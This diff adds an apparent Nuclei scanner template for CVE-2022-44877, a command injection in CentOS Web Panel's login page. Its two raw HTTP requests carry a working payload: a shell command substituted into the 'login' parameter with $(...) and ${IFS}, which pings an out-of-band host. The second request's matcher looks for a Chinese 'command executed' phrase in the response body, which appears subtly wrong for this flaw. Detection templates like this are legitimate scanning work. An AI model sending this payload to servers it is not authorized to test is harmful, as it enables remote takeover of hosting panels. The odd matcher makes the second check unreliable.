@@ -1,0 +1,50 @@
+id: cve-2022-44877
+info:
+  name: CentOS Web Panel RCE (CVE-2022-44877)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    CentOS Web Panel (CWP) is a free web hosting control panel from the Control Web Panel community. An operating system command injection vulnerability exists in CentOS Web Panel version 0.9.8.1147 due to improper validation of a user-supplied string before executing a system call. An attacker could exploit this vulnerability to execute arbitrary code.
+  tags: [rce, command-injection]
+  reference:
+    - https://github.com/numanturle/CVE-2022-44877
+
+variables:
+  cmd: "ping -c 1 {{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /login/index.php?login=$(ping${IFS}-c${IFS}1${IFS}{{interactsh-url}}) HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/login/index.php?login=failed
+
+        username=root&password=toor&commit=Login
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+
+  - raw:
+      - |
+        POST /login/index.php?login=$({{cmd}}) HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/login/index.php?login=failed
+
+        username=root&password=toor&commit=Login
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "命令已执行"
